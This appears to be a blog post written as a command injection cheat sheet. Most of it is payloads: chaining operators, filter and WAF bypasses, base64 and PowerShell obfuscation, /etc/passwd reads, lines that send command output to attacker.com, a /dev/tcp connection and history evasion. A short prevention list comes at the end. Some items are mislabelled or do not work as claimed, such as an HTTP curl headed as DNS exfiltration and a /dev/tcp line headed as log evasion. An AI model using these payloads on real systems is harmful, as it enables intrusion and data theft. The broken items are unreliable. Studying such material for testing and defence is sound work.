---
layout: post
title: Command Injection
date: 2025-04-10 17:15 +0300
categories: [Web Security, Server-side]
tags: [linux, windows, command injection]
---

## Introduction

Command injection is a web security vulnerability that allows an attacker to execute arbitrary commands on the host operating system via a vulnerable application. This vulnerability occurs when an application passes unsafe user-supplied data to a system shell.

## Command Injection Operators

### Basic Command Chaining Operators

| **Operator** | **Description** | **URL-Encoded** | **Behavior** |
|--------------|-----------------|-----------------|--------------|
| Semicolon (`;`) | Command separator | `%3b` | Executes both commands sequentially |
| New Line (`\n`) | Line break | `%0a` | Executes both commands sequentially |
| Ampersand (`&`) | Background operator | `%26` | Executes both commands (second output generally shown first) |
| Pipe (`\|`) | Pipe output | `%7c` | Executes both commands (only second's output shown) |
| AND (`&&`) | Logical AND | `%26%26` | Executes second command only if first succeeds |
| OR (`\|\|`) | Logical OR | `%7c%7c` | Executes second command only if first fails |
| Sub-Shell (`` ` ` ``) | Command substitution | `%60%60` | Executes command within backticks (Linux-only) |
| Sub-Shell (`$()`) | Command substitution | `%24%28%29` | Executes command within parentheses (Linux-only) |

### Windows-Specific Operators

| **Operator** | **Description** | **URL-Encoded** | **Example** |
|--------------|-----------------|-----------------|-------------|
| Caret (`^`) | Escape character | `%5e` | `who^ami` → `whoami` |
| Comma (`,`) | Command separator | `%2c` | `dir,whoami` |
| Parentheses (`()`) | Command grouping | `%28%29` | `(dir)` |
| Quoted strings | String literals | - | `"who"+"ami"` → `whoami` |

## Command Injection by Platform

### Linux/Unix Command Injection Examples

```bash
# Basic injection
ping -c 1 127.0.0.1; id
ping -c 1 127.0.0.1 && id
ping -c 1 127.0.0.1 | id
ping -c 1 127.0.0.1 || id

# Command substitution
ping -c 1 `id`
ping -c 1 $(id)

# Inline execution
{cat,/etc/passwd}
$(cat${IFS}/etc/passwd)
```

### Windows Command Injection Examples

```shell
# Basic injection
ping -n 1 127.0.0.1 & whoami
ping -n 1 127.0.0.1 && whoami
ping -n 1 127.0.0.1 | whoami
ping -n 1 127.0.0.1 || whoami

# Command grouping
ping -n 1 127.0.0.1 & (whoami)
```

## Bypassing Filters and WAF

### Bypass Spaces

#### Linux Space Bypass
```bash
# IFS (Internal Field Separator) environment variable
cat${IFS}/etc/passwd
cat$IFS/etc/passwd
{cat,/etc/passwd}

# Brace expansion
{cat,/etc/passwd}
cat${IFS}/etc/passwd

# Tab character instead of space
cat	/etc/passwd  # Tab character (%09)

# $IFS$9 (older systems)
cat$IFS$9/etc/passwd
```

#### Windows Space Bypass
```shell
# Using environment variable substrings
ping%PROGRAMFILES:~10,1%127.0.0.1

# Using carets (escape characters)
ping^  ^127.0.0.1
```

### Bypassing Blacklisted Characters

#### Linux Character Bypass

```bash
# Using strings from environment variables
echo ${PATH:0:1}  # Returns "/"
echo ${LS_COLORS:10:1}  # Returns a specific character

# Using quotes to break up commands
w'h'o'am'i
w"h"o"am"i

# Dollar sign evasion
who$@ami
w\ho\am\i

# Hex encoding
$(printf "\x77\x68\x6f\x61\x6d\x69")  # whoami
```

#### Windows Character Bypass

```shell
# Using environment variable substrings
echo %HOMEPATH:~6,-11%  # Returns "\"

# Using carets for escaping
who^ami

# PowerShell variable notation
$env:HOMEPATH[0]  # Returns "\"

# PowerShell concatenation
&("wh"+"oami")
```

## Advanced Command Obfuscation

### Case Manipulation

```bash
# Linux/Unix
WhOaMi  # Works if server doesn't enforce case sensitivity
$(tr "[A-Z]" "[a-z]"<<<"WhOaMi")
$(a="WhOaMi";printf %s "${a,,}")

# Windows PowerShell
WhOaMi  # Windows commands are case-insensitive by default
```

### Reversed Commands

```bash
# Linux/Unix
echo 'whoami' | rev  # Outputs "imaohw"
$(rev<<<'imaohw')  # Executes "whoami"

# Windows PowerShell
"whoami"[-1..-20] -join ''  # Outputs "imaohw"
iex "$('imaohw'[-1..-20] -join '')"  # Executes "whoami"
```

### Encoded Commands

```bash
# Base64 encoding (Linux)
echo -n 'cat /etc/passwd | grep 33' | base64  # Y2F0IC9ldGMvcGFzc3dkIHwgZ3JlcCAzMw==
bash<<<$(base64 -d<<<Y2F0IC9ldGMvcGFzc3dkIHwgZ3JlcCAzMw==)

# Unicode/Base64 (Windows PowerShell)
[Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes('whoami'))  # dwBoAG8AYQBtAGkA
powershell -EncodedCommand dwBoAG8AYQBtAGkA

# Converting between encodings
echo -n whoami | iconv -f utf-8 -t utf-16le | base64  # dwBoAG8AYQBtAGkA
```

## Multi-Step Obfuscation Examples

### Linux Complex Obfuscation

```bash
# Layered obfuscation
$(echo -n 'Y2F0IC9ldGMvcGFzc3dk' | base64 -d | sh)

# Character substitution + reversal
$(rev<<<'ssap/cte/ tac') | bash

# Variable expansion + hex encoding + IFS
h=$(printf "\x77\x68\x6f\x61\x6d\x69");$h

# Wildcard expansion
/???/??t /???/p??s??

# Nested encodings
echo -n 'echo -n "cat /etc/passwd" | base64' | base64 | base64 -d | bash | base64 -d | bash
```

### Windows Complex Obfuscation

```powershell
# PowerShell nested encoding
powershell -c "IEX([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('d2hvYW1p')))"

# Command splitting + joining
$a='who';$b='ami';iex ($a+$b)

# Obfuscation using environment variables and concatenation
&($env:ComSpec[4,15,25]-join'') # Executes 'exe'
```

## Special Techniques for Specific Environments

### PHP Command Injection

```php
// Common vulnerable PHP functions
system($_GET['cmd']);
exec($_GET['cmd']);
shell_exec($_GET['cmd']);
passthru($_GET['cmd']);
`$_GET['cmd']`;  // Backtick operator
```

### Python Command Injection

```python
# Vulnerable Python code
import os
os.system(user_input)  # Vulnerable
eval(user_input)       # Vulnerable
__import__('os').system('whoami')  # Obfuscated execution
```

### Node.js Command Injection

```javascript
// Vulnerable Node.js functions
child_process.exec(userInput);
child_process.execSync(userInput);
child_process.spawn(userInput);
```

## Blind Command Injection Techniques

### Time-Based Verification

```bash
# Linux time-based
ping -c 10 127.0.0.1  # Creates a 10-second delay
sleep 5  # 5-second delay

# Windows time-based
ping -n 10 127.0.0.1  # Creates a 10-second delay
timeout 5  # 5-second delay
```

### Out-of-Band Data Exfiltration

```bash
# DNS exfiltration (Linux)
whoami | curl http://attacker.com/$(base64)

# HTTP exfiltration (Windows)
powershell -c "Invoke-WebRequest -Uri ('http://attacker.com/'+[System.Convert]::ToBase64String([System.Text.Encoding]::UTF8.GetBytes((whoami))))"
```

## Defense Evasion Techniques

### Avoiding Specific Patterns

```bash
# Avoiding common filtered terms
cat /e"t"c/pa'ss'wd
c'a't /etc/passwd

# Breaking commands with environment variables
c${PATH:0:1}at /etc/passwd

# Using uninitialized variables
cat /etc/$u$passwd
```

### Log Evasion

```bash
# Command execution without history
unset HISTFILE; ls -la

# Event expansion in Bash
bash -c 'exec 3<>/dev/tcp/10.10.10.10/443;echo -e "GET / HTTP/1.1\r\nHost: 10.10.10.10\r\n\r\n">&3;cat<&3'
```

## Command Injection Prevention

1. **Input Validation:**
   - Whitelist allowed characters/inputs
   - Use parameterized APIs

2. **Output Encoding:**
   - Encode special characters before passing to shell

3. **Avoid Dangerous Functions:**
   - In PHP: `system()`, `exec()`, `shell_exec()`, `passthru()`, etc.
   - In Python: `os.system()`, `subprocess.call()` with shell=True
   - In Node.js: `child_process.exec()`

4. **Principle of Least Privilege:**
   - Run applications with minimal required permissions

5. **Use Safe APIs:**
   - In PHP: `escapeshellarg()` and `escapeshellcmd()`
   - In Python: `subprocess.run()` with shell=False and arguments as list

## References

- [OWASP Command Injection](https://owasp.org/www-community/attacks/Command_Injection)
- [PortSwigger Command Injection](https://portswigger.net/web-security/os-command-injection)
- [HackTricks Command Injection](https://book.hacktricks.xyz/pentesting-web/command-injection)


